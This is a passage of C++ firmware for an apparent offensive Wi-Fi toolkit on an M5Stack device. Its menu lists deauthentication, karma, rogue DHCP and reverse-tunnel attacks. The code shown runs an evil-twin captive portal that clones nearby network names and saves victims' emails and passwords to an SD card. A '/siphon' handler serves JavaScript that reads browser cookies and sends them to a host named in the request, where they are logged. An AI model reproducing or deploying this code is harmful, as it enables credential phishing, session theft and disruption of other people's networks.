          isKarmaMode = true;
          stopScanKarma();
          currentStateKarma = ssid_count_Karma > 0 ? StopScanKarma : StartScanKarma;
        }
        break;

      case StopScanKarma:
        handleMenuInputKarma();
        break;

      case SelectSSIDKarma:
        handleMenuInputKarma();
        break;
    }

    if (M5.BtnB.wasPressed() && currentStateKarma == StartScanKarma) {
      inMenu = true;
      isOperationInProgress = false;
    }
  }
}



void executeMenuItem(int index) {
  inMenu = false;
  isOperationInProgress = true;
  switch (index) {
    case 0:
      scanWifiNetworks();
      break;
    case 1:
      showWifiList();
      break;
    case 2:
      showWifiDetails(currentListIndex);
      break;
    case 3:
      createCaptivePortal();
      break;
    case 4:
      stopCaptivePortal();
      break;
    case 5:
      changePortal();
      break;
    case 6:
      checkCredentials();
      break;
    case 7:
      deleteCredentials();
      break;
    case 8:
      displayMonitorPage1();
      break;
    case 9:
      probeAttack();
      break;
    case 10:
      probeSniffing();
      break;
    case 11:
      karmaAttack();
      break;
    case 12:
      startAutoKarma();
      break;
    case 13:
      karmaSpear();
      break;
    case 14:
      listProbes();
      break;
    case 15:
      deleteProbe();
      break;
    case 16:
      deleteAllProbes();
      break;
    case 17:
      onOffBleSerial();
      break;
    case 18:
      wardrivingMode();
      break;
    case 19:
      startWardivingMaster();
      break;
    case 20:
      beaconAttack();
      break;
    case 21:
      deauthAttack(currentListIndex);
      break;
    case 22:
      sniffMaster();
      break;
    case 23:
      allTrafficSniffer();
      break;
    case 24:
      sniffNetwork();
      break;
    case 25:
      wifiVisualizer();
      break;
    case 26:
      deauthClients();
      break;
    case 27:
      deauthDetect();
      break;
    case 28:
      checkHandshakes();
      break;
    case 29:
      wallOfFlipper();
      break;
    case 30:
      connectWifi(currentListIndex);
      break;
    case 31:
      send_pwnagotchi_beacon_main();
      break;
    case 32:
      skimmerDetection();
      break;
    case 33:
      reverseTCPTunnel();
      break;
    case 34:
      startDHCPStarvation();
      break;
    case 35:
      rogueDHCP();
      break;
    case 36:
      switchDNS();
      break;
    case 37:
      DHCPAttackAuto();
      break;
    case 38:
      detectPrinter();
      break;
    case 39:
      printFile();
      break;
    case 40:
      checkPrinterStatus();
      break;
    case 41:
      startHoneypot();
      break;
    case 42:
      showSettingsMenu();
      break;
  }
  isOperationInProgress = false;
}


void handleMenuInput() {
  static bool aHeld = false;
  static bool cHeld = false;
  static bool aInitialDelayPassed = false;
  static bool cInitialDelayPassed = false;
  static unsigned long lastTimeA = 0;
  static unsigned long lastTimeC = 0;

  const unsigned long initialDelay = 400;
  const unsigned long repeatDelay  = 150;

  unsigned long now = millis();

  if (M5.BtnA.isPressed()) {
    if (!aHeld) {
      aHeld = true;
      aInitialDelayPassed = false;
      lastTimeA = now;
      currentIndex--;
      if (currentIndex < 0) currentIndex = menuSize - 1;
    } else {
      if (!aInitialDelayPassed) {
        if (now - lastTimeA >= initialDelay) {
          aInitialDelayPassed = true;
          currentIndex--;
          if (currentIndex < 0) currentIndex = menuSize - 1;
          lastTimeA = now;
        }
      } else {
        if (now - lastTimeA >= repeatDelay) {
          currentIndex--;
          if (currentIndex < 0) currentIndex = menuSize - 1;
          lastTimeA = now;
        }
      }
    }
  } else {
    aHeld = false;
    aInitialDelayPassed = false;
  }

  if (M5.BtnC.isPressed()) {
    if (!cHeld) {
      cHeld = true;
      cInitialDelayPassed = false;
      lastTimeC = now;
      currentIndex++;
      if (currentIndex >= menuSize) currentIndex = 0;
    } else {
      if (!cInitialDelayPassed) {
        if (now - lastTimeC >= initialDelay) {
          cInitialDelayPassed = true;
          currentIndex++;
          if (currentIndex >= menuSize) currentIndex = 0;
          lastTimeC = now;
        }
      } else {
        if (now - lastTimeC >= repeatDelay) {
          currentIndex++;
          if (currentIndex >= menuSize) currentIndex = 0;
          lastTimeC = now;
        }
      }
    }
  } else {
    cHeld = false;
    cInitialDelayPassed = false;
  }

  menuStartIndex = max(0, min(currentIndex, menuSize - maxMenuDisplay));

  if (M5.BtnB.wasPressed()) {
    executeMenuItem(currentIndex);
  }
}



void drawMenu() {
  M5.Display.fillRect(0, 17, M5.Display.width(), M5.Display.height() - 17, TFT_BLACK); // Effacer la partie inférieure de l'écran
  M5.Display.setTextSize(2);
  M5.Display.setTextFont(1);

  int lineHeight = 22;
  int startX = 5;
  int startY = 19;

  for (int i = 0; i < maxMenuDisplay; i++) {
    int menuIndex = menuStartIndex + i;
    if (menuIndex >= menuSize) break;

    if (menuIndex == currentIndex) {
      M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
      M5.Display.setTextColor(TFT_GREEN);
    } else {
      M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
    }
    M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
    M5.Display.println(menuItems[menuIndex]);
  }
  M5.Display.display();
}


void handleDnsRequestSerial() {
  dnsServer.processNextRequest();
  server.handleClient();
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    checkSerialCommands(command, false);
  }
  if (ESP_BT.available()) {
    String command = "";
    while (ESP_BT.available()) {
      char c = ESP_BT.read();
      command += c;
      if (c == '\n') {
        break;
      }
    }
    checkSerialCommands(command, true);
  }
}

bool bluetoothEnabled = false;

void onOffBleSerial() {
  if (bluetoothEnabled) {
    ESP_BT.end();
    Serial.println("Bluetooth turned off");
  } else {
    ESP_BT.begin(bluetoothName);
    ESP_BT.setPin("730303"); // NOT WORKING
    Serial.println("Bluetooth turned on");
  }
  bluetoothEnabled = !bluetoothEnabled;
}




void listProbesSerial() {
  File file = SD.open("/probes.txt", FILE_READ);
  if (!file) {
    Serial.println("Failed to open probes.txt");
    sendBLE("Failed to open probes.txt");
    return;
  }

  int probeIndex = 0;
  Serial.println("List of Probes:");
  sendBLE("List of Probes:");
  while (file.available()) {
    String probe = file.readStringUntil('\n');
    probe.trim();
    if (probe.length() > 0) {
      Serial.println(String(probeIndex) + ": " + probe);
      sendBLE(String(probeIndex) + ": " + probe);
      probeIndex++;
    }
  }
  file.close();
}

void selectProbeSerial(int index) {
  File file = SD.open("/probes.txt", FILE_READ);
  if (!file) {
    Serial.println("Failed to open probes.txt");
    return;
  }

  int currentIndex = 0;
  String selectedProbe = "";
  while (file.available()) {
    String probe = file.readStringUntil('\n');
    if (currentIndex == index) {
      selectedProbe = probe;
      break;
    }
    currentIndex++;
  }
  file.close();

  if (selectedProbe.length() > 0) {
    clonedSSID = selectedProbe;
    Serial.println("Probe selected: " + selectedProbe);
    sendBLE("Probe selected: " + selectedProbe);
  } else {
    Serial.println("Probe index not found.");
    sendBLE("Probe index not found.");
  }
}

String currentlySelectedSSID = "";
bool isProbeAttackRunning = false;
bool stopProbeSniffingViaSerial = false;
bool isProbeSniffingRunning = false;

void checkSerialCommands(String command, bool fromBluetooth) {
  command.trim();
  if (fromBluetooth) {
    if (connectionState == AWAITING_PASSWORD) {
      if (command.equals(bluetoothSerialPassword)) {
        connectionState = AUTHENTICATED;
        ESP_BT.println("Password correct, you are now authenticated");
        return;
      } else {
        ESP_BT.println("Password protected.");
        ESP_BT.disconnect();
        return;
      }
    }
  }

  if (connectionState == AUTHENTICATED || !fromBluetooth) {
    if (command == "scan_wifi") {
      isOperationInProgress = true;
      inMenu = false;
      scanWifiNetworks();
      sendBLE("-------------------");
      sendBLE("Near Wifi Network : ");
      for (int i = 0; i < numSsid; i++) {
        ssidList[i] = WiFi.SSID(i);
        sendBLE(String(i) + ": " + ssidList[i]);
      }
    } else if (command.startsWith("select_network")) {
      int ssidIndex = command.substring(String("select_network ").length()).toInt();
      selectNetwork(ssidIndex);
      sendBLE("SSID sélectionné: " + currentlySelectedSSID);
    } else if (command.startsWith("change_ssid ")) {
      String newSSID = command.substring(String("change_ssid ").length());
      cloneSSIDForCaptivePortal(newSSID);
      Serial.println("Cloned SSID changed to: " + clonedSSID);
      sendBLE("Cloned SSID changed to: " + clonedSSID);
    } else if (command.startsWith("set_portal_password ")) {
      String newPassword = command.substring(String("set_portal_password ").length());
      captivePortalPassword = newPassword;
      Serial.println("Captive portal password changed to: " + captivePortalPassword);
      sendBLE("Captive portal password changed to: " + captivePortalPassword);
    } else if (command.startsWith("set_portal_open")) {
      captivePortalPassword = "";
      Serial.println("Open Captive portal set");
      sendBLE("Open Captive portal set");
    } else if (command.startsWith("detail_ssid")) {
      int ssidIndex = command.substring(String("detail_ssid ").length()).toInt();
      String security = getWifiSecurity(ssidIndex);
      int32_t rssi = WiFi.RSSI(ssidIndex);
      uint8_t* bssid = WiFi.BSSID(ssidIndex);
      String macAddress = bssidToString(bssid);
      M5.Display.display();
      Serial.println("------Wifi-Info----");
      sendBLE("------Wifi-Info----");
      Serial.println("SSID: " + (ssidList[ssidIndex].length() > 0 ? ssidList[ssidIndex] : "N/A"));
      sendBLE("SSID: " + (ssidList[ssidIndex].length() > 0 ? ssidList[ssidIndex] : "N/A"));
      Serial.println("Channel: " + String(WiFi.channel(ssidIndex)));
      sendBLE("Channel: " + String(WiFi.channel(ssidIndex)));
      Serial.println("Security: " + security);
      sendBLE("Security: " + security);
      Serial.println("Signal: " + String(rssi) + " dBm");
      sendBLE("Signal: " + String(rssi) + " dBm");
      Serial.println("MAC: " + macAddress);
      sendBLE("MAC: " + macAddress);
      Serial.println("-------------------");
      sendBLE("-------------------");
    } else if (command == "clone_ssid") {
      cloneSSIDForCaptivePortal(currentlySelectedSSID);
      Serial.println("Cloned SSID: " + clonedSSID);
      sendBLE("Cloned SSID: " + clonedSSID);
    } else if (command == "start_portal") {
      createCaptivePortal();
      sendBLE("Start portal with " + clonedSSID);
    } else if (command == "stop_portal") {
      stopCaptivePortal();
      sendBLE("Portal Stopped ");
    } else if (command == "list_portal") {
      File root = SD.open("/sites");
      numPortalFiles = 0;
      Serial.println("Available portals:");
      sendBLE("-------------------");
      sendBLE("Availables portals :");
      while (File file = root.openNextFile()) {
        if (!file.isDirectory()) {
          String fileName = file.name();
          if (fileName.endsWith(".html")) {
            portalFiles[numPortalFiles] = String("/sites/") + fileName;

            Serial.print(numPortalFiles);
            Serial.print(": ");
            Serial.println(fileName);
            sendBLE(String(numPortalFiles) + ": " + fileName);
            numPortalFiles++;
            if (numPortalFiles >= 30) break; // max 30 files
          }
        }
        file.close();
      }
      root.close();
    } else if (command.startsWith("change_portal")) {
      int portalIndex = command.substring(String("change_portal ").length()).toInt();
      changePortal(portalIndex);
    } else if (command == "check_credentials") {
      checkCredentialsSerial();
    } else if (command == "monitor_status") {
      String status = getMonitoringStatus();
      Serial.println("-------------------");
      sendBLE("-------------------");
      Serial.println(status);
      sendBLE(status);
    } else if (command == "probe_attack") {
      isOperationInProgress = true;
      inMenu = false;
      isItSerialCommand = true;
      probeAttack();
      delay(200);
    } else if (command == "stop_probe_attack") {
      if (isProbeAttackRunning) {
        isProbeAttackRunning = false;
        Serial.println("-------------------");
        sendBLE("-------------------");
        Serial.println("Stopping probe attack...");
        sendBLE("Stopping probe attack...");
        Serial.println("-------------------");
        sendBLE("-------------------");
      } else {
        Serial.println("-------------------");
        sendBLE("-------------------");
        Serial.println("No probe attack running.");
        sendBLE("No probe attack running.");
        Serial.println("-------------------");
        sendBLE("-------------------");
      }
    } else if (command == "probe_sniffing") {
      isOperationInProgress = true;
      inMenu = false;
      probeSniffing();
      delay(200);
    } else if (command == "stop_probe_sniffing") {
      stopProbeSniffingViaSerial = true;
      isProbeSniffingRunning = false;
      Serial.println("-------------------");
      sendBLE("-------------------");
      Serial.println("Stopping probe sniffing via serial...");
      sendBLE("Stopping probe sniffing via serial...");
      Serial.println("-------------------");
      sendBLE("-------------------");
    } else if (command == "list_probes") {
      listProbesSerial();
    } else if (command.startsWith("select_probes ")) {
      int index = command.substring(String("select_probes ").length()).toInt();
      selectProbeSerial(index);
    } else if (command == "karma_auto") {
      isOperationInProgress = true;
      inMenu = false;
      startAutoKarma();
      delay(200);
    } else if (command == "exit") {
      Serial.println("Disconnecting Bluetooth.");
      ESP_BT.println("Disconnecting. Connexion protected by Password.");
      ESP_BT.disconnect();
      connectionState = AWAITING_PASSWORD;
      return;
    } else if (command == "help") {
      Serial.println("-------------------");
      sendBLE("-------------------");
      Serial.println("Available Commands:");
      sendBLE("Available Commands:");
      Serial.println("scan_wifi - Scan WiFi Networks");
      sendBLE("scan_wifi - Scan WiFi Networks");
      Serial.println("select_network <index> - Select WiFi <index>");
      sendBLE("select_network <index> - Select WiFi <index>");
      Serial.println("change_ssid <max 32 char> - change current SSID");
      sendBLE("change_ssid <max 32 char> - change current SSID");
      Serial.println("set_portal_password <password min 8> - change portal password");
      sendBLE("set_portal_password <password min 8> - portal pass");
      Serial.println("set_portal_open  - change portal to open");
      sendBLE("set_portal_open - change portal to open");
      Serial.println("detail_ssid <index> - Details of WiFi <index>");
      sendBLE("detail_ssid <index> - Details of WiFi <index>");
      Serial.println("clone_ssid - Clone Network SSID");
      sendBLE("clone_ssid - Clone Network SSID");
      Serial.println("start_portal - Activate Captive Portal");
      sendBLE("start_portal - Activate Captive Portal");
      Serial.println("stop_portal - Deactivate Portal");
      sendBLE("stop_portal - Deactivate Portal");
      Serial.println("list_portal - Show Portal List");
      sendBLE("list_portal - Show Portal List");
      Serial.println("change_portal <index> - Switch Portal <index>");
      sendBLE("change_portal <index> - Switch Portal <index>");
      Serial.println("check_credentials - Check Saved Credentials");
      sendBLE("check_credentials - Check Saved Credentials");
      Serial.println("monitor_status - Get current information on device");
      sendBLE("monitor_status - Get current information on device");
      Serial.println("probe_attack - Initiate Probe Attack");
      Serial.println("stop_probe_attack - End Probe Attack");
      Serial.println("probe_sniffing - Begin Probe Sniffing");
      Serial.println("stop_probe_sniffing - End Probe Sniffing");
      Serial.println("list_probes - Show Probes");
      sendBLE("list_probes - Show Probes");
      Serial.println("select_probes <index> - Choose Probe <index>");
      sendBLE("select_probes <index> - Choose Probe <index>");
      Serial.println("karma_auto - Auto Karma Attack Mode");
      sendBLE("exit - !! exit and set password for new connexion !!");
      Serial.println("-------------------");
      sendBLE("-------------------");
    } else {
      Serial.println("-------------------");
      sendBLE("-------------------");
      Serial.println("Command not recognized: " + command);
      sendBLE("Command not recognized: " + command);
      Serial.println("-------------------");
      sendBLE("-------------------");
    }
  }
}

void sendBLE(String message) {
  ESP_BT.print(message + "\n");
}

String getMonitoringStatus() {
  String status;
  int numClientsConnected = WiFi.softAPgetStationNum();
  int numCredentials = countPasswordsInFile();

  status += "Clients: " + String(numClientsConnected) + "\n";
  status += "Credentials: " + String(numCredentials) + "\n";
  status += "SSID: " + String(clonedSSID) + "\n";
  status += "Portal: " + String(isCaptivePortalOn ? "On" : "Off") + "\n";
  status += "Page: " + String(selectedPortalFile.substring(7)) + "\n";
  status += "Bluetooth: " + String(bluetoothEnabled ? "ON" : "OFF") + "\n";
  updateConnectedMACs();
  status += "Connected MACs:\n";
  for (int i = 0; i < 10; i++) {
    if (macAddresses[i] != "") {
      status += macAddresses[i] + "\n";
    }
  }
  status += "Stack left: " + getStack() + " Kb\n";
  status += "RAM: " + getRamUsage() + " Mo\n";
  status += "Battery: " + getBatteryLevel() + "%\n"; // thx to kdv88 to pointing this correction
  status += "Temperature: " + getTemperature() + "C\n";
  return status;
}



void checkCredentialsSerial() {
  File file = SD.open("/credentials.txt");
  if (!file) {
    Serial.println("Failed to open credentials file");
    return;
  }
  bool isEmpty = true;
  Serial.println("----------------------");
  Serial.println("Credentials Found:");
  Serial.println("----------------------");
  sendBLE("----------------------");
  sendBLE("Credentials Found:");
  sendBLE("----------------------");
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.length() > 0) {
      Serial.println(line);
      sendBLE(line);
      isEmpty = false;
    }
  }
  file.close();
  if (isEmpty) {
    Serial.println("No credentials found.");
    sendBLE("No credentials found.");
  }
}

void changePortal(int index) {
  File root = SD.open("/sites");
  int currentIndex = 0;
  String selectedFile;
  while (File file = root.openNextFile()) {
    if (currentIndex == index) {
      selectedFile = String(file.name());
      break;
    }
    currentIndex++;
    file.close();
  }
  root.close();
  if (selectedFile.length() > 0) {
    Serial.println("Changing portal to: " + selectedFile);
    sendBLE("Changing portal to: " + selectedFile);
    selectedPortalFile = "/sites/" + selectedFile;
  } else {
    Serial.println("Invalid portal index");
  }
}

void selectNetwork(int index) {
  if (index >= 0 && index < numSsid) {
    currentlySelectedSSID = ssidList[index];
    Serial.println("SSID sélectionné: " + currentlySelectedSSID);
  } else {
    Serial.println("Index SSID invalide.");
  }
}

void scanWifiNetworks() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  unsigned long startTime = millis();
  int n;
  while (millis() - startTime < 5000) {
    M5.Display.clear();
    M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
    M5.Display.setCursor(50 , M5.Display.height() / 2 );
    M5.Display.print("Scan in progress... ");
    Serial.println("-------------------");
    Serial.println("WiFi Scan in progress... ");
    M5.Display.display();
    n = WiFi.scanNetworks();
    if (n != WIFI_SCAN_RUNNING) break;
  }
  Serial.println("-------------------");
  Serial.println("Near Wifi Network : ");
  numSsid = min(n, 100);
  for (int i = 0; i < numSsid; i++) {
    ssidList[i] = WiFi.SSID(i);
    Serial.print(i);
    Serial.print(": ");
    Serial.println(ssidList[i]);
  }
  Serial.println("-------------------");
  Serial.println("WiFi Scan Completed ");
  Serial.println("-------------------");
  waitAndReturnToMenu("Scan Completed");

}


void showWifiList() {
  const int listDisplayLimit = M5.Display.height() / 18;
  int listStartIndex = max(0, min(currentListIndex, numSsid - listDisplayLimit));

  M5.Display.clear();
  M5.Display.setTextSize(2);
  for (int i = listStartIndex; i < min(numSsid, listStartIndex + listDisplayLimit + 1); i++) {
    if (i == currentListIndex) {
      M5.Display.fillRect(0, (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
      M5.Display.setTextColor(TFT_GREEN);
    } else {
      M5.Display.setTextColor(TFT_WHITE);
    }
    M5.Display.setCursor(10, (i - listStartIndex) * 18);
    M5.Display.println(ssidList[i]);
  }
  M5.Display.display();

  while (!inMenu) {
    M5.update();
    handleDnsRequestSerial();
    if (M5.BtnA.wasPressed()) {
      currentListIndex--;
      if (currentListIndex < 0) {
        currentListIndex = numSsid - 1;
      }
      showWifiList();
    } else if (M5.BtnC.wasPressed()) {
      currentListIndex++;
      if (currentListIndex >= numSsid) {
        currentListIndex = 0;
      }
      showWifiList();
    } else if (M5.BtnB.wasPressed()) {
      inMenu = true;
      Serial.println("-------------------");
      Serial.println("SSID " + ssidList[currentListIndex] + " selected");
      Serial.println("-------------------");
      waitAndReturnToMenu(ssidList[currentListIndex] + "\n      selected");

    }
  }
}


void showWifiDetails(int &networkIndex) {
  inMenu = false;

  auto updateDisplay = [&]() {
    if (networkIndex >= 0 && networkIndex < numSsid) {
      M5.Display.clear();
      M5.Display.setTextSize(2);
      int y = 10;

      // SSID
      M5.Display.setCursor(10, y);
      M5.Display.println("SSID: " + (ssidList[networkIndex].length() > 0 ? ssidList[networkIndex] : "N/A"));
      y += 40;

      // Channel
      int channel = WiFi.channel(networkIndex);
      M5.Display.setCursor(10, y);
      M5.Display.println("Channel: " + (channel > 0 ? String(channel) : "N/A"));
      y += 20;

      // Security
      String security = getWifiSecurity(networkIndex);
      M5.Display.setCursor(10, y);
      M5.Display.println("Security: " + (security.length() > 0 ? security : "N/A"));
      y += 20;

      // Signal Strength
      int32_t rssi = WiFi.RSSI(networkIndex);
      M5.Display.setCursor(10, y);
      M5.Display.println("Signal: " + (rssi != 0 ? String(rssi) + " dBm" : "N/A"));
      y += 20;

      // MAC Address
      uint8_t* bssid = WiFi.BSSID(networkIndex);
      String macAddress = bssidToString(bssid);
      M5.Display.setCursor(10, y);
      M5.Display.println("MAC: " + (macAddress.length() > 0 ? macAddress : "N/A"));
      y += 20;

      M5.Display.setCursor(35, 220);
      M5.Display.println("Next");
      M5.Display.setCursor(140, 220);
      M5.Display.println("Back");
      M5.Display.setCursor(238, 220);
      M5.Display.println("Clone");

      M5.Display.display();
      Serial.println("------Wifi-Info----");
      Serial.println("SSID: " + ssidList[networkIndex]);
      Serial.println("Channel: " + String(WiFi.channel(networkIndex)));
      Serial.println("Security: " + security);
      Serial.println("Signal: " + String(rssi) + " dBm");
      Serial.println("MAC: " + macAddress);
      Serial.println("-------------------");
    }

  };

  updateDisplay();

  while (!inMenu) {
    M5.update();
    handleDnsRequestSerial();

    if (M5.BtnC.wasPressed()) {
      cloneSSIDForCaptivePortal(ssidList[networkIndex]);
      inMenu = true;
      waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
      Serial.println(ssidList[networkIndex] + " Cloned...");
      drawMenu();
      break; // Sortir de la boucle
    } else if (M5.BtnA.wasPressed()) {
      networkIndex = (networkIndex + 1) % numSsid;
      updateDisplay();
    } else if (M5.BtnB.wasPressed()) {
      inMenu = true;
      drawMenu();
      break;
    } else if (M5.BtnPWR.wasClicked()) {
      networkIndex = (networkIndex - 1 + numSsid) % numSsid;
      updateDisplay();
    }
  }
}


String getWifiSecurity(int networkIndex) {
  switch (WiFi.encryptionType(networkIndex)) {
    case WIFI_AUTH_OPEN:
      return "Open";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA_WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2_ENTERPRISE";
    default:
      return "Unknown";
  }
}

String bssidToString(uint8_t* bssid) {
  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(mac);
}

void cloneSSIDForCaptivePortal(String ssid) {
  clonedSSID = ssid;
}

// Global variables specific to save-file function
File saveFileObject;             // File object for saving
bool isSaveFileAuthorized = false; // Authorization flag for saving file


// Log cookies to SD card
void logCookiesToSD(String cookies, String domain) {
  File file = SD.open("/cookies.log", FILE_APPEND);
  if (file) {
    // On log l’information de manière plus complète
    file.println("Siphon Entry");
    file.println("  Domain : " + domain);
    file.println("  Cookies: " + cookies);
    file.println("----------");
    file.close();
  } else {
    Serial.println("Failed to open cookies log file!");
  }
}

void handleCookieSiphoning() {
  // Récupérer le paramètre 'domain' depuis la query string
  String paramDomain = server.arg("domain");
  if (paramDomain.isEmpty()) {
    paramDomain = "UnknownDomain";  // Fallback si le paramètre n'est pas envoyé
  }

  // Construction du payload HTML avec corrections
  String payload = R"rawliteral(
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Cookie Siphoning</title>
  </head>
  <body>
    <script>
      document.addEventListener("DOMContentLoaded", function() {
        try {
          const cookies = document.cookie;
          if (cookies) {
            const img = document.createElement('img');
            img.style.display = 'none';
            img.src = `http://${encodeURIComponent(')rawliteral" + paramDomain + R"rawliteral(')}/logcookie?cookies=${encodeURIComponent(cookies)}&domain=${encodeURIComponent(')rawliteral" + paramDomain + R"rawliteral(')}`;
            document.body.appendChild(img);
          }
        } catch (error) {
          console.error('Error siphoning cookies:', error);
        }
      });
    </script>
  </body>
</html>
)rawliteral";

  // Ajout des en-têtes personnalisés
  server.sendHeader("Content-Type", "text/html; charset=UTF-8");
  server.sendHeader("Server", "EvilTap/1.0 7h30th3r0n3/0.1");
  server.sendHeader("Cache-Control", "public, max-age=99936000");
  server.sendHeader("Expires", "Sat, 26 Jul 2040 05:00:00 GMT");
  server.sendHeader("Last-Modified", "Tue, 15 Nov 1994 12:45:26 GMT");
  server.sendHeader("Access-Control-Allow-Origin", "*");

  // Envoi de la réponse avec le contenu HTML
  server.send(200, "text/html", payload);
}






void handleLogRequest() {
  // Récupérer les cookies
  String cookies = server.arg("cookies");
  // Récupérer le paramètre 'domain'
  String paramDomain = server.arg("domain");

  if (cookies.isEmpty()) {
    Serial.println("Requête ignorée : cookies vides.");
    server.send(204, "text/plain", ""); // Réponse vide
    return;
  }
  if (paramDomain.isEmpty()) {
    paramDomain = "UnknownDomain";
  }

  // Récupérer le Referer depuis les en-têtes
  String referer = server.header("Referer");
  if (referer.isEmpty()) {
    referer = "UnknownReferer";
  }

  // Affichage debug sur le port série
  Serial.println("Cookies reçus via /log :");
  Serial.println("  Domain : " + paramDomain);
  Serial.println("  Cookies: " + cookies);
  Serial.println("----------------------");

  // Journaliser dans le fichier
  logCookiesToSD(cookies, paramDomain);

  // Réponse 1x1 pixel
  server.send(200, "image/gif",
    "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\xff\x00"
    "\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x01"
    "\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02"
    "\x44\x01\x00\x3b");
}





void createCaptivePortal() {
  String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
     // Vérification de la connexion Wi-Fi et mise à jour des variables
  if (WiFi.localIP().toString() == "0.0.0.0") {
        WiFi.mode(WIFI_MODE_AP);
  } else {
        WiFi.mode(WIFI_MODE_APSTA);
  }
  if (!isAutoKarmaActive) {
    if (captivePortalPassword == "") {
      WiFi.softAP(clonedSSID.c_str());
    } else {
      WiFi.softAP(clonedSSID.c_str(), captivePortalPassword.c_str());
    }

  }
  ipAP = WiFi.softAPIP();
  ipSTA = WiFi.localIP();
  
  dnsServer.start(DNS_PORT, "*", ipAP);
  isCaptivePortalOn = true;
  
  server.on("/siphon", handleCookieSiphoning);
  server.on("/logcookie", handleLogRequest);

  
  server.on("/", HTTP_GET, []() {
    String email = server.arg("email");
    String password = server.arg("password");
    if (!email.isEmpty() && !password.isEmpty()) {
      saveCredentials(email, password, selectedPortalFile.substring(7), clonedSSID); // Assurez-vous d'utiliser les bons noms de variables
      server.send(200, "text/plain", "Credentials Saved");
    } else {
      Serial.println("-------------------");
      Serial.println("Direct Web Access !!!");
      Serial.println("-------------------");
      servePortalFile(selectedPortalFile);
    }
  });



  server.on("/evil-m5core2-menu", HTTP_GET, []() {
      String html = "<!DOCTYPE html><html><head><style>";
      html += "body{font-family:sans-serif;background:#f0f0f0;padding:40px;display:flex;justify-content:center;align-items:center;height:100vh}";
      html += "form{text-align:center;}div.menu{background:white;padding:20px;box-shadow:0 4px 8px rgba(0,0,0,0.1);border-radius:10px}";
      html += "input,a{margin:10px;padding:8px;width:80%;box-sizing:border-box;border:1px solid #ddd;border-radius:5px}";
      html += "a{display:inline-block;text-decoration:none;color:white;background:#007bff;text-align:center}";
      html += "</style></head><body>";
      html += "<div class='menu'><form action='/evil-m5core2-menu' method='get'>";
      html += "Password: <input type='password' name='pass'><br>";
      html += "<a href='javascript:void(0);' onclick='this.href=\"/credentials?pass=\"+document.getElementsByName(\"pass\")[0].value'>Credentials</a>";
      html += "<a href='javascript:void(0);' onclick='this.href=\"/uploadhtmlfile?pass=\"+document.getElementsByName(\"pass\")[0].value'>Upload File On SD</a>";
      html += "<a href='javascript:void(0);' onclick='this.href=\"/check-sd-file?pass=\"+document.getElementsByName(\"pass\")[0].value'>Check SD File</a>";
      html += "<a href='javascript:void(0);' onclick='this.href=\"/setup-portal?pass=\"+document.getElementsByName(\"pass\")[0].value'>Setup Portal</a>";
      html += "<a href='javascript:void(0);' onclick='this.href=\"/scan-network?pass=\"+document.getElementsByName(\"pass\")[0].value'>Scan Network</a>";
      html += "<a href='javascript:void(0);' onclick='this.href=\"/monitor-status?pass=\"+document.getElementsByName(\"pass\")[0].value'>Monitor Status</a>";  // Lien vers Monitor Status
      html += "</form></div></body></html>";
      
      server.send(200, "text/html", html);
      Serial.println("-------------------");
      Serial.println("evil-m5core2-menu access.");
      Serial.println("-------------------");
  });



  server.on("/credentials", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password == accessWebPassword) {
      File file = SD.open("/credentials.txt");
      if (file) {
        if (file.size() == 0) {
          server.send(200, "text/html", "<html><body><p>No credentials...</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
        } else {
          server.streamFile(file, "text/plain");
        }
        file.close();
      } else {
        server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      }
    } else {
      server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    }
  });


  server.on("/check-sd-file", HTTP_GET, handleSdCardBrowse);
  server.on("/download-sd-file", HTTP_GET, handleFileDownload);
  server.on("/download-all-files", HTTP_GET, handleDownloadAllFiles);
  server.on("/list-directories", HTTP_GET, handleListDirectories);

  server.on("/uploadhtmlfile", HTTP_GET, []() {
    if (server.arg("pass") == accessWebPassword) {
      String password = server.arg("pass");
      String html = "<!DOCTYPE html><html><head>";
      html += "<meta charset='UTF-8'>";
      html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
      html += "<title>Upload File</title></head>";
      html += "<body><div class='container'>";
      html += "<form id='uploadForm' method='post' enctype='multipart/form-data'>";
      html += "<input type='file' name='file' accept='*/*'>";
      html += "Select directory: <select id='dirSelect' name='directory'>";
      html += "<option value='/'>/</option>";
      html += "</select><br>";
      html += "<input type='submit' value='Upload file'>";
      html += "</form>";
      html += "<script>";
      html += "window.onload = function() {";
      html += "    var passValue = '" + password + "';";
      html += "    var dirSelect = document.getElementById('dirSelect');";
      html += "    fetch('/list-directories?pass=' + encodeURIComponent(passValue))";
      html += "        .then(response => response.text())";
      html += "        .then(data => {";
      html += "            const dirs = data.split('\\n');";
      html += "            dirs.forEach(dir => {";
      html += "                if (dir.trim() !== '') {";
      html += "                    var option = document.createElement('option');";
      html += "                    option.value = dir;";
      html += "                    option.textContent = dir;";
